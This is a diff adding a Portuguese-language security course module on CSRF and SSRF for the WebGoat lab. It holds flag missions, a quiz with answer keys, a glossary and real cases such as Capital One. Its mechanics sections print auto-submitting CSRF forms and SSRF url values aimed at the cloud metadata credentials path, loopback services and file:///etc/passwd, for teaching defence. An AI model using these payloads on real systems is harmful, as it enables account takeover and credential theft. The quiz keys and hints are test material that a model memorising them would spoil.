@@ -1,0 +1,1093 @@
+---
+slug: csrf-e-ssrf
+track: trilha-4
+title: "CSRF e SSRF"
+prerequisites: [web-por-dentro]
+lab: webgoat
+tasks:
+  - slug: missao-1-csrf
+    title: "Missão 1 — Forjar uma ação cross-site (CSRF)"
+    type: flag
+    prompt: "Depois de resolver a lição CSRF do WebGoat (a review forjada aceita de outro site) e de rodar as quatro requisições de diagnóstico da missão, monte FLAG{assignment-N}, tudo em minúsculas: 'assignment' é o valor exato do campo \"assignment\" que só aparece na resposta JSON do POST /csrf/review; 'N' é quantas das suas quatro requisições (outro host, mesmo host, sem Referer, token errado) o servidor RECUSOU — isto é, respondeu com lessonCompleted igual a false."
+    hint: "Para 'assignment': olhe o JSON que o POST /csrf/review devolve — tem um campo \"assignment\" com o nome interno da lição; passe para minúsculas. Para 'N': repita o POST com quatro combinações (Referer de outro host, Referer do próprio WebGoat, sem Referer, e token validateReq errado) e conte em quantas o campo lessonCompleted veio false."
+    flag:
+      hash: "scrypt$16384$8$1$7f00374c6ad45767cff212ee52da2d45d3d12a45fc4da8faa1c7438b679d55bf"
+      salt: "bc5247730f43ae314ad20b627f09a095"
+  - slug: missao-2-ssrf
+    title: "Missão 2 — Desviar a requisição do servidor (SSRF)"
+    type: flag
+    prompt: "Depois de resolver as duas tarefas da lição SSRF do WebGoat, monte FLAG{alt-estado}, tudo em minúsculas e com os espaços trocados por hífen: 'alt' é o texto alternativo (o atributo alt) que o servidor devolve na imagem quando você manda à tarefa 1 uma url que não é nem a do Tom nem a do Jerry; 'estado' é a palavra que o servidor usa, na saída de sucesso da tarefa 2, para descrever a situação do site externo que ele tentou buscar."
+    hint: "Para 'alt': na tarefa 1, troque o parâmetro url por qualquer coisa que não seja images/tom.png nem images/jerry.png e leia o campo output do JSON — a tag <img> traz um alt=\"...\". Para 'estado': na tarefa 2, mande url=http://ifconfig.pro (exato, com http:// e sem barra no fim) e leia a frase do campo output; ela diz que o site está em certo estado."
+    flag:
+      hash: "scrypt$16384$8$1$24e683a51f151ccdba064be3177cff0da1f193c91075021d4fc89e4a17b431ca"
+      salt: "078d1f7690d4a87b12c7763577529200"
+  - slug: quiz-final
+    title: "Quiz — CSRF e SSRF"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Por que um ataque CSRF funciona mesmo o atacante NUNCA conseguindo ler a resposta do servidor?"
+        options:
+          - "Porque o atacante quebra a criptografia do cookie e lê a resposta assim mesmo"
+          - "Porque o servidor envia a resposta para o atacante quando o pedido vem de outro site"
+          - "Porque o dano do CSRF é o efeito colateral (mudar e-mail, transferir, postar), que acontece no ENVIO do pedido; ler a resposta seria só um bônus, e a mesma-origem o impede"
+          - "Porque o navegador desliga a mesma-origem para pedidos POST"
+        answer: 2
+        explanation: "CSRF mira ações que mudam estado: o estrago se consuma quando o servidor processa o pedido forjado. A mesma-origem impede o JavaScript do atacante de LER a resposta, mas não impede o pedido de ser ENVIADO e ter efeito. Por isso não ler a resposta não é proteção, e por isso o alvo são sempre ações com efeito colateral."
+      - question: "Qual característica de um cookie de sessão é a raiz de o CSRF ser possível?"
+        options:
+          - "O navegador anexa o cookie SOZINHO a todo pedido para aquele site, mesmo quando o pedido parte de outra origem (ambient authority)"
+          - "O cookie é criptografado, então o servidor confia nele"
+          - "O cookie contém a senha do usuário em texto claro"
+          - "O cookie só é enviado em pedidos GET"
+        answer: 0
+        explanation: "O cookie é uma ambient authority (autoridade ambiente): o navegador o envia automaticamente a cada pedido ao domínio dono, sem o código pedir e sem olhar de onde o pedido partiu. É isso que a página do atacante explora — ela dispara o pedido, e o navegador acrescenta o cookie da vítima. Criptografia e método HTTP não têm a ver com a causa."
+      - question: "O cookie de sessão marcado como `SameSite=Lax` ajuda contra CSRF porque…"
+        options:
+          - "criptografa o valor do cookie"
+          - "faz o navegador NÃO anexar o cookie na maioria dos pedidos que partem de outro site (com exceções, como a navegação top-level por GET)"
+          - "impede o servidor de aceitar pedidos POST"
+          - "esconde o cookie do próprio servidor"
+        answer: 1
+        explanation: "SameSite=Lax (ou Strict) instrui o navegador a não enviar o cookie em requisições cross-site, cortando a ambient authority que o CSRF usa. Lax ainda permite o cookie em navegação top-level por GET, por isso não cobre 100% dos casos e não substitui o token anti-CSRF. Ele não criptografa nada nem bloqueia POST em geral."
+      - question: "Por que um token anti-CSRF aleatório e por sessão barra a página do atacante, mas um token FIXO e compartilhado (como o do WebGoat no lab) não?"
+        options:
+          - "Porque o token fixo é curto demais para ser seguro"
+          - "Porque o token fixo não é enviado pelo navegador"
+          - "Porque o servidor ignora tokens fixos"
+          - "Porque o token aleatório a página do atacante não consegue LER (está em outra origem, a mesma-origem a impede); já um valor fixo o atacante copia uma vez e reusa à vontade"
+        answer: 3
+        explanation: "A força do token está em ser imprevisível e inacessível à origem do atacante: a mesma-origem impede o site malicioso de ler o token embutido na página legítima, então ele não consegue reproduzi-lo. Um token estático e igual para todos perde essa propriedade — basta copiá-lo uma vez. O tamanho não é o ponto, e o problema não é envio nem o servidor ignorar."
+      - question: "Em um ataque SSRF, o que o atacante ganha ao fazer o servidor buscar uma URL que ele controla?"
+        options:
+          - "A posição de rede do servidor: pedidos que partem de DENTRO alcançam serviços internos, o loopback (127.0.0.1) e o metadata service da nuvem — tudo inalcançável direto da internet"
+          - "Acesso de leitura ao banco de dados do navegador da vítima"
+          - "A senha de root do servidor, sempre"
+          - "Permissão de escrita no disco do atacante"
+        answer: 0
+        explanation: "SSRF transforma o servidor em procurador (proxy) do atacante: como a requisição sai de dentro da rede, ela atravessa o firewall de borda e chega a destinos privados — APIs internas sem autenticação, o próprio 127.0.0.1 do servidor e o endereço de metadados da nuvem. O atacante empresta o alcance e a confiança do servidor; não é garantia de root nem tem relação com o navegador da vítima."
+      - question: "No caso Capital One (2019), por que a SSRF foi tão grave a ponto de levar ao vazamento de dados de cerca de 100 milhões de pessoas?"
+        options:
+          - "A SSRF apagou o banco de dados diretamente"
+          - "A SSRF instalou um ransomware na nuvem"
+          - "A SSRF alcançou o metadata service da AWS (169.254.169.254) e leu as credenciais temporárias do papel (role) atribuído ao servidor, que tinha permissão ampla para ler os buckets de armazenamento"
+          - "A SSRF quebrou a criptografia TLS do site"
+        answer: 2
+        explanation: "A requisição forjada pelo WAF mal configurado chegou ao serviço de metadados da instância e extraiu as credenciais IAM temporárias da máquina; como esse papel tinha permissão excessiva, as credenciais abriram os buckets S3 com os dados. É a cadeia SSRF → metadata → credenciais → dados. Nada de apagar banco, ransomware ou quebrar TLS."
+      - question: "Qual é a defesa mais correta contra SSRF?"
+        options:
+          - "Bloquear por uma blocklist a string `169.254.169.254` na URL"
+          - "Validar o destino por allowlist (domínios/protocolos permitidos), resolver o nome e conferir o IP resultante contra faixas internas/link-local DEPOIS de resolver, conectando só a esse IP validado — e preferir não aceitar URL do usuário quando der"
+          - "Rodar o servidor como root para ele poder validar melhor"
+          - "Confiar que o firewall de borda já impede tudo"
+        answer: 1
+        explanation: "A cura é positiva: só deixar passar destinos explicitamente permitidos (allowlist de domínio e protocolo) e, quando a URL for inevitável, resolver o nome, validar o IP final contra faixas privadas e link-local e conectar exatamente a esse IP — validar depois de resolver (e fixar o IP) fecha truques de DNS. Blocklist de strings é contornável (redirecionamentos, IP em decimal, DNS rebinding); root piora o impacto; o firewall de borda não vê o pedido que nasce dentro."
+glossary:
+  - term: SSRF
+    definition: "Server-Side Request Forgery (falsificação de requisição no lado do servidor): falha em que o atacante faz o servidor emitir, ele mesmo, uma requisição para uma URL que o atacante controla. Como o pedido parte de dentro, alcança serviços internos, o loopback e o metadata service que o atacante não alcançaria de fora. É a CWE-918."
+  - term: confused deputy
+    definition: "Deputado confuso: um programa com mais privilégio (o 'deputado') é enganado por outro, com menos, a usar sua autoridade em nome dele. Conceito cunhado por Norm Hardy em 1988. No CSRF o navegador é o deputado confuso (anexa o cookie da vítima a um pedido do atacante); no SSRF é o servidor (empresta sua posição de rede)."
+  - term: login CSRF
+    definition: "Variante de CSRF em que o atacante força a vítima a fazer login na conta DO ATACANTE (forjando o pedido de login com as credenciais dele). A vítima passa a agir numa conta que o atacante controla e monitora — o histórico, os dados salvos, tudo vai para o atacante. Descrita no artigo de Barth, Jackson e Mitchell (2008)."
+  - term: instance metadata service
+    definition: "Instance Metadata Service (IMDS): serviço que, em nuvem (AWS, GCP, Azure), responde só de dentro da máquina, no endereço link-local 169.254.169.254, e entrega dados da instância — inclusive as credenciais temporárias do papel (role) atribuído a ela. Alvo clássico de SSRF."
+  - term: IMDSv2
+    definition: "Versão 2 do metadata service da AWS (lançada em novembro de 2019, após o caso Capital One): exige primeiro um PUT para obter um token de sessão, enviado depois no cabeçalho X-aws-ec2-metadata-token. O PUT e o token barram a maioria dos SSRF, que só conseguem forjar um GET simples; a resposta do PUT ainda vem com TTL de rede 1 (não cruza para fora da instância) e não é dada a quem envia X-Forwarded-For."
+  - term: link-local address
+    definition: "Endereço link-local: faixa de IP (169.254.0.0/16 no IPv4; fe80::/10 no IPv6) que só vale dentro do próprio enlace de rede e nunca é roteada para fora. Por responder apenas localmente, é onde a nuvem coloca o metadata service — e por isso só um pedido nascido dentro da máquina o alcança."
+  - term: blind SSRF
+    definition: "SSRF cego: o servidor faz a requisição que o atacante pediu, mas não devolve a resposta a ele. O atacante confirma e explora a falha por sinais indiretos — tempo de resposta, erros diferentes, ou um pedido que chega a um servidor seu (out-of-band)."
+  - term: double-submit cookie
+    definition: "Padrão de defesa contra CSRF que dispensa guardar o token na sessão do servidor: o mesmo token vai num cookie E num cabeçalho (ou campo) do pedido, e o servidor confere que os dois batem. Na versão robusta, o token é assinado/atrelado à sessão (HMAC), porque a versão ingênua é burlável por quem consegue gravar cookies no domínio."
+---
+
+import fluxoCsrf from "./img/fluxo-csrf.svg";
+import alcanceSsrf from "./img/alcance-ssrf.svg";
+import topologiaDoLab from "./img/topologia-do-lab.svg";
+import defesasCsrf from "./img/defesas-csrf.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Até aqui, nas falhas da Trilha 4, o atacante conversava **diretamente** com o
+servidor: mandava uma aspa no login, um `<script>` num campo, um `;` num campo de
+ping. Este módulo vira o jogo de dois modos que assustam justamente por fugir desse
+padrão.
+
+No primeiro, <GlossaryTerm term="CSRF">CSRF</GlossaryTerm> (*Cross-Site Request
+Forgery*, falsificação de requisição entre sites), quem envia o pedido malicioso
+**não é o atacante — é o navegador da própria vítima**, enganado. O atacante nunca
+toca no servidor; ele monta uma armadilha numa página sua, a vítima (logada no
+site-alvo) abre essa página, e o navegador dela dispara, com o cookie de sessão
+anexado automaticamente, uma ação que a vítima jamais quis: trocar o e-mail da
+conta, transferir dinheiro, publicar algo. É o que 4.1 já prenunciava quando você
+viu que *o navegador anexa o cookie sozinho*.
+
+No segundo, <GlossaryTerm term="SSRF">SSRF</GlossaryTerm> (*Server-Side Request
+Forgery*, falsificação de requisição no lado do servidor), quem faz o pedido
+malicioso **é o próprio servidor**, também enganado. O atacante dá ao servidor uma
+URL de sua escolha, e o servidor vai buscá-la — alcançando, de dentro da rede,
+serviços internos, o próprio `127.0.0.1` e, na nuvem, o serviço de metadados que
+guarda as credenciais da máquina. Foi essa a falha que custou à Capital One os
+dados de cerca de **100 milhões** de pessoas (seção 4).
+
+Os dois têm a mesma assinatura: uma requisição é emitida por um
+<GlossaryTerm term="confused deputy">confused deputy</GlossaryTerm> (deputado
+confuso) — alguém com autoridade (o navegador tem o cookie; o servidor tem a
+posição de rede) que é induzido a usá-la em nome do atacante. Entender essa
+figura é entender as duas falhas de uma vez.
+
+**Ao final, você vai saber:**
+
+- explicar por que o navegador anexar o cookie sozinho (a *ambient authority* de
+  4.1) é a raiz do CSRF, e por que o alvo são sempre ações que **mudam estado**;
+- forjar uma ação *cross-site* no WebGoat e entender por que não ler a resposta
+  não protege a vítima;
+- explicar por que um servidor que busca uma URL controlada pelo usuário vira um
+  SSRF, e o que ele alcança que o atacante não alcançaria sozinho;
+- fazer o servidor do WebGoat buscar um destino à sua escolha e mapear o estrago
+  (rede interna, loopback, metadata service da nuvem);
+- defender de verdade: token anti-CSRF por sessão, `SameSite`, conferência de
+  origem; e, contra SSRF, allowlist de destino e validação do IP após resolver o
+  nome.
+
+**Pré-requisitos:** 4.1 — Como a web funciona por dentro (de lá você traz o cookie
+de sessão e a <GlossaryTerm term="ambient authority">ambient authority</GlossaryTerm>,
+a <GlossaryTerm term="same-origin policy">same-origin policy</GlossaryTerm> — que
+deixa **enviar** entre origens mas não **ler** a resposta —, os cabeçalhos
+<GlossaryTerm term="Origin header">Origin</GlossaryTerm> e
+<GlossaryTerm term="Referer header">Referer</GlossaryTerm>, e o
+<GlossaryTerm term="preflight request">preflight</GlossaryTerm> do
+<GlossaryTerm term="CORS">CORS</GlossaryTerm>).
+
+**Tempo estimado:** de 4 a 6 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Tudo aqui se faz **só** no laboratório local (o WebGoat, vulnerável de propósito e
+sem acesso à internet) ou em um alvo com **autorização por escrito**. Um CSRF real
+transfere dinheiro ou sequestra contas de terceiros; um SSRF real alcança a rede
+interna de uma empresa. Rodá-los contra sistema alheio sem autorização é crime no
+Brasil (art. 154-A do Código Penal, visto na Trilha 1). A página de atacante e os
+pedidos forjados deste módulo existem apenas dentro do lab isolado.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+As duas falhas deste módulo são **requisições forjadas** (*request forgery*). A
+diferença está em quem é enganado a fazer a requisição: no CSRF, o navegador da
+vítima (*client-side*); no SSRF, o servidor (*server-side*). Vamos uma de cada vez.
+
+### 2.1 A peça que torna o CSRF possível: o cookie viaja sozinho
+
+Lembre de 4.1: quando você faz login, o servidor devolve um cookie de sessão, e o
+navegador o guarda **associado ao domínio** daquele site. A partir daí, a cada
+pedido para aquele domínio — qualquer pedido, vindo de qualquer lugar — o navegador
+**anexa o cookie automaticamente**. Ele não pergunta ao código se deve; não olha de
+que página o pedido partiu. Essa é a <GlossaryTerm term="ambient authority">ambient
+authority</GlossaryTerm> (autoridade ambiente): a autoridade (estar logado) está
+"no ar", colada ao navegador, e acompanha o pedido sem ninguém pedir.
+
+É uma comodidade enorme — é o que faz você não ter que relogar a cada clique. E é
+exatamente o buraco. Porque se **outra** página, de outro site, conseguir fazer o
+seu navegador disparar um pedido para o banco, o navegador vai anexar o seu cookie
+do banco do mesmo jeito. Para o servidor do banco, o pedido chega com um cookie
+válido e é indistinguível de um que você mesmo fez.
+
+A analogia que dá nome à falha, cunhada por Norm Hardy em **1988**, é o
+<GlossaryTerm term="confused deputy">confused deputy</GlossaryTerm>, o deputado
+confuso. Imagine um porteiro (o navegador) que guarda a sua chave (o cookie) e
+abre a porta do cofre para qualquer bilhete que diga "abra o cofre" — sem conferir
+quem escreveu o bilhete. O atacante não precisa roubar a chave: basta entregar o
+bilhete ao porteiro, que usa a **sua** chave por você. O navegador é esse porteiro:
+tem autoridade (o cookie), e a usa sem checar quem mandou o pedido.
+
+### 2.2 O que o atacante consegue forjar — e o que não consegue
+
+Aqui entra a <GlossaryTerm term="same-origin policy">same-origin policy</GlossaryTerm>
+(SOP) de 4.1, com a sua assimetria crucial. A SOP **não impede** uma página de um
+site **enviar** requisições para outro: um `<form>` pode dar `POST` para qualquer
+lugar, uma `<img src>` dispara um `GET` para qualquer URL, o `fetch()` manda o
+pedido. O que a SOP bloqueia é **ler a resposta**: o JavaScript de `mal.com` não
+enxerga o que `banco.com` respondeu.
+
+Para o CSRF, essa assimetria é perfeita:
+
+- **Enviar é o que basta.** Se a ação muda estado (transfere, troca senha, apaga),
+  o estrago se consuma no **envio**. O atacante não precisa ler nada.
+- **Ler seria bônus — e é o que a SOP nega.** Por isso o CSRF mira ações com efeito
+  colateral, não leitura de dados (para roubar dados você precisaria ler a resposta,
+  e aí a SOP atrapalha; isso é mais terreno de XSS ou de um CORS mal configurado).
+
+<Figure
+  src={fluxoCsrf}
+  alt="Três colunas: o navegador da vítima (logada em banco.com, guardando o cookie de sessão), a página do atacante (mal.com) e o servidor banco.com. Passo 1: a vítima faz login e recebe o cookie. Passo 2: ainda logada, abre a página do atacante. Passo 3: essa página dispara sozinha um POST para banco.com/transferir com valor e destino do atacante. Passo 4: o navegador anexa automaticamente o cookie de banco.com, mesmo o pedido tendo partido de mal.com. Passo 5: o servidor vê um cookie válido, acha que é a vítima e executa a transferência. Passo 6: a resposta volta ao navegador da vítima, não ao atacante (a mesma-origem o impede de ler), mas a transferência já ocorreu."
+  caption="O CSRF não rouba o cookie — faz o navegador usá-lo. O dano acontece no envio (passo 5); não ler a resposta (passo 6) não protege ninguém."
+/>
+
+Repare no que o atacante precisa saber: o **endereço** e o **formato** do pedido
+que muda estado (campos, método). Isso costuma ser público ou fácil de descobrir
+inspecionando o site. O que ele **não** tem é o cookie — e não precisa, porque o
+navegador o fornece.
+
+### 2.3 CSRF por GET e por POST
+
+O caso mais simples é uma ação disparada por `GET`. A própria lição do WebGoat dá o
+exemplo de um e-mail com um link disfarçado:
+
+```html
+<a href="http://banco.com/transferir?de=123&para=999&valor=100000">Veja minhas fotos!</a>
+```
+
+Se a vítima estiver logada no banco e clicar, o `GET` sai com o cookie. Pior: nem
+precisa de clique — uma `<img>` escondida dispara o `GET` ao carregar a página:
+
+```html
+<img src="http://banco.com/transferir?de=123&para=999&valor=100000" width="1" height="1">
+```
+
+Por isso vale a regra de ouro do lado do servidor: **`GET` nunca muda estado**.
+Para ações por `POST` (o correto para quem muda estado), o atacante usa um
+formulário que se envia sozinho:
+
+```html
+<form action="https://banco.com/transferir" method="POST" id="f">
+  <input type="hidden" name="para"  value="conta-do-atacante">
+  <input type="hidden" name="valor" value="100000">
+</form>
+<script>document.getElementById('f').submit();</script>
+```
+
+A vítima só precisa abrir a página; o `submit()` dispara o `POST`, o navegador
+anexa o cookie, e pronto. Guarde este molde — é exatamente o que você vai fazer no
+laboratório, hospedando a página num companheiro do WebGoat chamado **WebWolf**.
+
+### 2.4 Agora o SSRF: quando quem é enganado é o servidor
+
+Troque o deputado confuso. No CSRF era o navegador; no SSRF é o **servidor**.
+
+Muitas aplicações precisam, do lado do servidor, buscar algo por uma URL: gerar a
+miniatura de uma imagem a partir de um link, consultar um webhook, validar um
+endereço, importar um feed. Quando a URL vem (no todo ou em parte) **do usuário** e
+a aplicação a busca sem validar o destino, nasce o
+<GlossaryTerm term="SSRF">SSRF</GlossaryTerm>: o atacante escolhe a URL, e o
+servidor a acessa por ele.
+
+Por que isso é grave? Por causa da **posição de rede** do servidor. Direto da
+internet, o atacante não alcança a rede interna de uma empresa, nem o `127.0.0.1`
+do servidor (o <GlossaryTerm term="loopback">loopback</GlossaryTerm>, o endereço
+que só vale dentro da própria máquina), nem o endereço de metadados da nuvem — tudo
+isso é privado, protegido pelo firewall de borda. Mas o servidor alcança. Ao
+fazê-lo buscar a URL que você deu, o pedido **nasce dentro** da rede e herda a
+confiança de quem está dentro.
+
+<Figure
+  src={alcanceSsrf}
+  alt="Da esquerda para a direita: o atacante na internet manda um parâmetro de URL controlado (por exemplo http://169.254.169.254/latest/meta-data/) no lugar da URL esperada. O servidor vulnerável, na borda, aceita pedidos de fora e alcança a rede interna; ele mesmo busca a URL recebida sem validar o destino. Uma linha tracejada marca a fronteira de confiança. À direita dela, três alvos que o pedido nascido dentro alcança: serviços internos sem autenticação (bancos de dados, painéis de admin), o loopback do servidor (127.0.0.1) e o metadata service da nuvem em 169.254.169.254, que entrega credenciais temporárias do papel da máquina."
+  caption="O atacante empresta a posição de rede do servidor. A falha não é 'buscar uma URL', é buscar a URL que o usuário controla sem validar para onde ela aponta."
+/>
+
+Três destinos clássicos de um SSRF:
+
+- **Serviços internos.** Bancos de dados, filas, painéis de administração e APIs
+  que confiam na rede ("se chegou aqui, é de dentro, então é de confiança") e por
+  isso nem pedem autenticação. O SSRF fala com eles.
+- **O próprio servidor (`127.0.0.1`).** Serviços que só escutam no *loopback* por
+  serem "privados" — um actuator de debug, um admin em porta alta.
+- **O <GlossaryTerm term="instance metadata service">metadata service</GlossaryTerm>
+  da nuvem.** Em AWS/GCP/Azure, um endereço
+  <GlossaryTerm term="link-local address">link-local</GlossaryTerm> fixo,
+  `169.254.169.254`, responde **só de dentro da instância** e entrega dados da
+  máquina — inclusive, na versão 1 do serviço da AWS, as **credenciais temporárias**
+  do papel (*role*) atribuído a ela. Um SSRF que chega lá rouba essas credenciais.
+  Foi o coração do caso Capital One (seção 4).
+
+### 2.5 A mesma raiz das outras injeções
+
+Repare no parentesco com tudo que você viu na Trilha 4. Em toda injeção, um dado
+controlado pelo atacante cruza uma <GlossaryTerm term="trust boundary">trust
+boundary</GlossaryTerm> (fronteira de confiança) e é tratado como algo mais
+poderoso do que um dado deveria ser. Na SQLi o dado virou comando SQL; na command
+injection, comando de shell. No CSRF e no SSRF, o "dado" é uma **requisição**: no
+CSRF, o atacante injeta uma requisição na sessão autenticada da vítima; no SSRF,
+injeta um destino na função que o servidor usa para buscar coisas. Em todos, a cura
+tem o mesmo espírito: nunca confiar na entrada para decidir o que executar, para
+onde conectar ou em nome de quem agir.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos destrinchar as duas, com requisições concretas.
+
+### 3.1 CSRF: anatomia de um pedido forjado
+
+Imagine que o alvo troca o e-mail da conta com este pedido legítimo (o que o site
+faz quando **você** usa o formulário de "alterar e-mail"):
+
+```http
+POST /conta/email HTTP/1.1
+Host: banco.com
+Cookie: session=<cookie-de-sessao-da-vitima>
+Content-Type: application/x-www-form-urlencoded
+Origin: https://banco.com
+Referer: https://banco.com/conta
+
+novo_email=vitima@exemplo.com
+```
+
+O atacante quer que esse mesmo pedido saia, mas com `novo_email` apontando para o
+e-mail **dele** (assim ele recebe o link de "redefinir senha" e toma a conta). Ele
+não tem o cookie da vítima. Então ele não envia o pedido — ele faz o **navegador da
+vítima** enviá-lo. Hospeda esta página em `mal.com`:
+
+```html
+<form action="https://banco.com/conta/email" method="POST" id="f">
+  <input type="hidden" name="novo_email" value="atacante@mal.com">
+</form>
+<script>document.getElementById('f').submit();</script>
+```
+
+Quando a vítima (logada em `banco.com`) abre `mal.com`, o pedido que sai do
+navegador dela é:
+
+```http
+POST /conta/email HTTP/1.1
+Host: banco.com
+Cookie: session=<cookie-de-sessao-da-vitima>      ← anexado pelo navegador, sozinho
+Content-Type: application/x-www-form-urlencoded
+Origin: https://mal.com                            ← a pista: a origem é outra
+Referer: https://mal.com/armadilha.html            ← e o Referer também
+
+novo_email=atacante@mal.com
+```
+
+Duas coisas para gravar. Primeira: o `Cookie` está lá, embora a vítima não tenha
+feito nada além de abrir uma página — é a *ambient authority* agindo. Segunda: os
+cabeçalhos `Origin` e `Referer` **denunciam** que o pedido veio de `mal.com`, não
+de `banco.com`. Essa denúncia é o que uma defesa de origem (seção 8) usa — e é o
+que o WebGoat confere no laboratório.
+
+### 3.2 SSRF: anatomia de um destino desviado
+
+Suponha um serviço que gera a miniatura de uma imagem recebida por URL:
+
+```http
+POST /miniatura HTTP/1.1
+Host: app.exemplo.com
+Content-Type: application/x-www-form-urlencoded
+
+url=https://cdn.exemplo.com/foto.png
+```
+
+O servidor pega esse `url` e faz, **ele mesmo**, um `GET` nele para baixar a imagem.
+O atacante troca o valor:
+
+```http
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+O servidor, sem validar, faz o `GET` nesse endereço **de dentro da instância** —
+onde o metadata service responde. A resposta (a lista de papéis e, no passo
+seguinte, as credenciais) volta para a aplicação, que pode ecoá-la na tela, salvá-la
+como "a miniatura", ou vazá-la numa mensagem de erro. Variações do destino levam a
+outros lugares:
+
+```text
+url=http://127.0.0.1:8080/actuator/env     → painel interno que só escuta no loopback
+url=http://10.0.5.12:6379/                  → um Redis interno sem senha
+url=file:///etc/passwd                      → se o buscador aceitar o esquema file://
+url=http://interno.empresa.local/admin      → um host da rede interna, por nome
+```
+
+O ponto técnico: a função que busca a URL (um `URL.openStream()` em Java, um
+`requests.get()` em Python, um `curl` por trás) **não distingue** uma URL legítima
+de uma maliciosa. Para ela, é só uma URL. Quem tinha que distinguir era a aplicação,
+**antes** de passar o valor adiante — e não o fez. É literalmente o que você vai ver
+no código da lição SSRF do WebGoat: um `new URL(url).openStream()` sem nenhuma
+checagem do destino.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+Três casos, verificados em fonte primária, cobrindo as duas falhas.
+
+### Capital One: um SSRF que vazou cerca de 100 milhões de pessoas (2019)
+
+Em **julho de 2019**, o banco americano Capital One revelou uma das maiores
+violações de dados da história do setor financeiro. A invasão aconteceu entre
+**março e meados de julho de 2019**; a Capital One só soube em **17 de julho de
+2019**, por uma denúncia por e-mail avisando que havia dados dela expostos
+publicamente no GitHub, e divulgou o caso em **29 de julho de 2019**, dia em que o
+FBI prendeu a responsável, Paige Thompson.
+
+A técnica foi um <GlossaryTerm term="SSRF">SSRF</GlossaryTerm>. Thompson explorou um
+<GlossaryTerm term="WAF">WAF</GlossaryTerm> (*Web Application Firewall*, um filtro de
+requisições na frente da aplicação) mal configurado — o ModSecurity — que também
+agia como <GlossaryTerm term="reverse proxy">reverse proxy</GlossaryTerm>. Os
+senadores Ron Wyden e Elizabeth Warren, em carta de **24 de outubro de 2019**
+pedindo à FTC que investigasse a Amazon, resumiram assim: *"a hacker stole the
+personal information of 100 million Americans from Capital One using a popular
+cyberattack technique known as a 'server side request forgery' (SSRF)"*. Pela
+análise técnica de Evan Johnson (Cloudflare) publicada no KrebsOnSecurity em **2 de
+agosto de 2019**, o pedido forjado chegou ao
+<GlossaryTerm term="instance metadata service">metadata service</GlossaryTerm> da
+AWS (`169.254.169.254`) e leu as **credenciais temporárias** do papel (IAM *role*)
+atribuído ao servidor. A denúncia criminal detalha a cadeia: as credenciais da
+"`******-WAF-Role`" rodaram um *List Buckets Command* e um *Sync Command* que
+listaram e **copiaram** mais de **700** *buckets* (pastas) de dados de armazenamento
+— porque o papel tinha permissão ampla demais.
+
+- **Impacto:** cerca de **100 milhões** de pessoas nos EUA e **6 milhões** no
+  Canadá; aproximadamente **140 mil** números de *Social Security* e **80 mil**
+  números de conta bancária nos EUA, e cerca de **1 milhão** de números de seguro
+  social canadenses (SIN). A Capital One recebeu multa de **US$ 80 milhões** do
+  regulador bancário (OCC) em **6 de agosto de 2020** e pagou **US$ 190 milhões** em
+  acordo com clientes. Thompson foi **condenada em 17 de junho de 2022** por sete
+  crimes federais (fraude eletrônica, cinco acessos não autorizados a computador
+  protegido e dano a computador protegido; foi absolvida de fraude de dispositivo de
+  acesso e roubo de identidade) e, em **outubro de 2022**, sentenciada a tempo já
+  cumprido mais cinco anos de liberdade vigiada.
+- **Lição:** a cadeia **SSRF → metadata → credenciais → dados** é o pior cenário da
+  nuvem. Duas defesas teriam cortado o ataque: validar o destino da requisição do
+  WAF (não deixá-lo buscar `169.254.169.254`) e dar ao papel o **mínimo
+  privilégio**. Em **19 de novembro de 2019**, a AWS lançou o
+  <GlossaryTerm term="IMDSv2">IMDSv2</GlossaryTerm>, que exige um token por sessão e
+  dificulta o acesso via SSRF.
+- **Fontes:** [Wyden & Warren — press release à FTC, 24/10/2019](https://www.wyden.senate.gov/news/press-releases/wyden-and-warren-to-ftc-investigate-amazons-negligence-in-capital-one-hack),
+  [KrebsOnSecurity, 02/08/2019](https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/)
+  e [Departamento de Justiça dos EUA (USAO-WDWA), 17/06/2022](https://www.justice.gov/usao-wdwa/pr/former-seattle-tech-worker-convicted-wire-fraud-and-computer-intrusions).
+
+### ProxyLogon: um SSRF que abriu servidores Exchange (2021)
+
+Em **2 de março de 2021**, a Microsoft publicou correção de emergência para a
+**CVE-2021-26855**, um <GlossaryTerm term="SSRF">SSRF</GlossaryTerm> **pré-
+autenticação** no Microsoft Exchange Server. Nas palavras da própria Microsoft, é
+*"a server-side request forgery (SSRF) vulnerability in Exchange which allowed the
+attacker to send arbitrary HTTP requests and authenticate as the Exchange server"*.
+Encadeada com a CVE-2021-27065 (escrita de arquivo pós-autenticação), ela compunha o
+**ProxyLogon**, que levava à execução remota de código sem credenciais. O SSRF era o
+primeiro elo: permitia ao atacante, sem logar, falar com componentes internos do
+Exchange como se fosse o próprio servidor, e a partir daí autenticar-se como
+administrador.
+
+- **Impacto:** a CVE recebeu <GlossaryTerm term="CWE">CWE</GlossaryTerm>-918 (a mesma
+  categoria do SSRF) e nota <GlossaryTerm term="CVSS">CVSS</GlossaryTerm> **9.8**
+  (base da NVD/NIST; a própria Microsoft pontuou **9.1**) — crítica. Atingia o
+  Exchange Server **2013, 2016 e 2019** e foi explorada em massa no mundo todo nas
+  semanas seguintes à divulgação, entrando no catálogo de vulnerabilidades
+  ativamente exploradas (KEV) da CISA.
+- **Lição:** um SSRF não precisa ir à nuvem para ser catastrófico — aqui ele
+  alcançou serviços internos do próprio produto. E mostra como um elo SSRF vira a
+  porta de entrada de uma cadeia que termina em
+  <GlossaryTerm term="remote code execution">RCE</GlossaryTerm> (execução remota de
+  código).
+- **Fontes:** [Microsoft — HAFNIUM targeting Exchange Servers (02/03/2021)](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)
+  e [NVD — CVE-2021-26855](https://nvd.nist.gov/vuln/detail/CVE-2021-26855).
+
+### Login CSRF em Yahoo, PayPal e Google (2008)
+
+O artigo acadêmico *"Robust Defenses for Cross-Site Request Forgery"*, de Adam
+Barth, Collin Jackson e John C. Mitchell (apresentado na conferência ACM CCS, em
+**outubro de 2008**) — o mesmo que a lição do WebGoat cita — documentou CSRF em
+sites de primeira linha e cunhou a variante
